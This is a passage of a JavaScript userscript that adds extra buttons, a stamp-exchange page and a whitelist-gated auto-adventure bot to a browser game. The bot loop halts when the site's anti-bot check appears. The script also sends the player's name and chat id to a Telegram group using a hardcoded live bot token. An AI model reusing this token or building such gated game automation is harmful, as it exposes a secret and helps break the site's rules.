`)</td><td>路加達．戒<br>C箱<br>三國．啟動碼<br>薑餅仔的眼睛<br>捕捉器<br>50000 hp回復劑<br>金太陽徽章<br>120000 hp回復劑<br>160000 hp回復劑<br>200000 hp回復劑<br>幻想會員證<br>80000 hp回復劑<br>500霧靈換領券<br>一階封神石<br>幻想寶箱<br>卡片寶箱<br>殘卷寶箱<br>二百億換領券<br>石頭寶箱<br>咒紋錦盒<br>一百億兌換卷<br>封印錦盒<br><font color="0000FF">登入禮卷</font><br></td></tr><tr><td><input type="button" value="200個印花" onclick="if(confirm('是否使用200個印花換領禮物?')){parent.changeStamp(200,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 200) + `)</td><td><font color="0000FF">登入禮卷</font><br>1500霧靈換領券<br>200%天籟真元(250場)<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br>封印錦盒<br></td></tr><tr><td><input type="button" value="500個印花" onclick="if(confirm('是否使用500個印花換領禮物?')){parent.changeStamp(500,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 500) + `)</td><td>200%天籟真元(700場)<br>素材寶箱<br>潘朵拉的卡片<br>赫淮斯托斯的卡片<br>一百億兌換卷<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br></td></tr><tr><td><input type="button" value="1000個印花" onclick="if(confirm('是否使用1000個印花換領禮物?')){parent.changeStamp(1000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 1000) + `)</td><td>殘卷寶箱<br>B箱<br>六百億換領券<br>幽冥護符<br>神諸葛亮<br>神呂布<br></td></tr><tr><td><input type="button" value="2000個印花" onclick="if(confirm('是否使用2000個印花換領禮物?')){parent.changeStamp(2000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 2000) + `)</td><td>魅力之水<br>體質之水<br>生命之水<br>信仰之水<br>王者護符<br><font color="FFD700">精剛石</font><br>5000霧靈換領券<br>仙奇丹<br><font color="FFD700">封印的金龍石</font><br></td></tr><tr><td><input type="button" value="6000個印花" onclick="if(confirm('是否使用6000個印花換領禮物?')){parent.changeStamp(6000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 6000) + `)</td><td><font color="FFD700">封印的金龍石</font><br><font color="FFD700">至尊書頁</font><br>A箱<br>智力之水<br><font color="FFFF99">糖糖</font><br>V剎經驗包<br>幻想廢礦<br>力量之水<br>速度之水<br>十億經驗值乾坤袋<br></td></tr><tr></tr></tbody></table></form>`);
    parent.stampHouseCss();
}
async function getStampNumber() {
    let formData = new FormData();
    formData.append('f', "chara");
    formData.append('act', "status_view");

    let stampNo = await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        })
        .then(async (response) => {
            return response.text();
        }).then((html) => {
            let start = (html.indexOf("show_status") + 12);
            let temp = html.substring(start, html.length);
            let end = temp.indexOf(";");
            temp = temp.substring(0, end - 1);
            let myArray = temp.split(",");
            let stampNo = myArray[myArray.length - 1];
            return parseInt(stampNo.replace("'", ""));
        });
    return stampNo;
}
function stampHouseCss() {
    let styles = `
	    input#changeTime::-webkit-outer-spin-button,
	    input#changeTime::-webkit-inner-spin-button {
		  -webkit-appearance: none;
		  margin: 0;
		}`;
    let styleSheet = document.createElement("style");
    styleSheet.textContent = styles;
    parent.wog_view.document.head.appendChild(styleSheet);
}
async function checkWhite(){
fetch('https://raw.githack.com/TauRus1001/Wog/refs/heads/main/white.json')
        .then((response) => response.json())
        .then(
            async (json) => {
                b = json.a.filter(e => e.n == btoa(encodeURIComponent(parent.p_name)) && e.c == sessionStorage.getItem("tempc"));
                if (b.length > 0) {
                    alert("已生效");
                } else {
                    alert("未生效");
                }
            });	
}
function setChatid() {
    let chatid = "";
    if (sessionStorage.getItem("tgid") == null) {
        chatid = prompt("輸入telegram chat id", "");
    } else {
        chatid = prompt("輸入telegram chat id", sessionStorage.getItem("tgid"));
    }
    if (chatid === null | chatid === "") {
        console.log("canceled");
        return;
    }
    sessionStorage.setItem("tgid", chatid);
    let c = genRndCode();
    fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4635269629&text=" + parent.p_name + "|chat_id:" + chatid + "|" + c);
    sessionStorage.setItem("tempc", c);
    sessionStorage.setItem("rTime", 0);
    alert(c);
}
function genRndCode() {
    const upperChars = [];
    const lowerChars = [];
    for (let i = 65; i < 91; i++) {
        let char = String.fromCharCode(i);
        upperChars.push(char);
        lowerChars.push(char.toLowerCase());
    }
    const arr = upperChars.concat(lowerChars);
    let randomChar = arr[Math.floor(Math.random() * 52)];
    const nums = [];
    for (let i = 0; i <= 9; i++) {
        nums.push(i);
    }

    const myArr = upperChars.concat(lowerChars, nums);
    const sixCodes = [];

    for (let i = 1; i <= 6; i++) {
        let randomCode = myArr[Math.floor(Math.random() * 62)];
        sixCodes.push(randomCode);
    }
    let result = sixCodes.join('');
    sessionStorage.setItem("tempc", result);

    return result;
}
async function getWhite() {
    let setJ = await fetch('https://raw.githack.com/TauRus1001/Wog/refs/heads/main/white.json')
        .then((response) => response.json())
        .then(
            async (json) => {
                b = json.a.filter(e => e.n == btoa(encodeURIComponent(parent.p_name)) && e.c == sessionStorage.getItem("tempc"));
                if (b.length > 0) {
                    a = new Date();
                    for (let runtime = sessionStorage.getItem("rTime"); runtime < 3e2 + 1; runtime++) {
                        if (parent.foot.document.f1.ats1.value != "開始冒險") {
                            await parent.sleep(5000);
                            continue;
                        }
                        if (parent.wog_view.document.getElementsByTagName("table")[0].getElementsByTagName("td")[0].innerText == "站長要考驗大家是否有認真在玩") {
                            parent.genRndCode();
                            break;
                        }
                        ad_view();
                        await parent.sleep(1000);
                        z();
                        sessionStorage.setItem("rTime", runtime);
                        await parent.sleep(7500);
                        if (new Date() - a > (3.6e6)) {
                            parent.genRndCode();
                            return;
                        }
                    }
                    parent.genRndCode();
                }
            });
}
function createExtraFunction() {
    //https://ithelp.ithome.com.tw/m/articles/10291496
    addConciseMode();
    const oriTable = parent.foot.document.getElementsByTagName("Table")[1].getElementsByTagName("tbody")[0].getElementsByTagName("tr")[0];

    let newColumn1 = document.createElement('td');
    newColumn1.setAttribute('valign', 'top');
    oriTable.appendChild(newColumn1);
    newColumn1.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='一鍵改運' onclick='parent.changeLuck()' class='button' accesskey='1'></td></tr><tr><td><input type='button' value='一鍵換裝' onclick='parent.armPage()' class='button' accesskey='2'></td></tr></tbody></table>";

    let newColumn2 = document.createElement('td');
    newColumn2.setAttribute('valign', 'top');
    oriTable.appendChild(newColumn2);
    newColumn2.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='復活中心' onclick='parent.act_click(\"chara\",\"revive\")' class='button' accesskey='3'></td></tr><tr><td><input type='button' value='新印花屋' onclick='parent.newStampHouse()' class='button' accesskey='4'></td></tr></tbody></table>";

    let newColumn3 = document.createElement('td');
    newColumn3.setAttribute('valign', 'top');
    oriTable.appendChild(newColumn3);
    newColumn3.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='通知設定' onclick='parent.setChatid()' class='button' accesskey='5'></td></tr></tbody></table>";

    fetch('https://raw.githack.com/TauRus1001/Wog/refs/heads/main/white.json')
        .then((response) => response.json())
        .then(
            async (json) => {
                b = json.a.filter(e => e.n === btoa(encodeURIComponent(parent.p_name)));
                if (b.length > 0) {
                    let newColumnS = document.createElement('td');
                    newColumnS.setAttribute('valign', 'top');
                    oriTable.appendChild(newColumnS);
                    newColumnS.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='測試冒險' onclick='parent.getWhite()' class='button'></td></tr><tr><td><input type='button' value='生效狀態' onclick='parent.checkWhite()' class='button'></td></tr></tbody></table>";
                } else {
                    console.log("not matched");
                }
            });
}
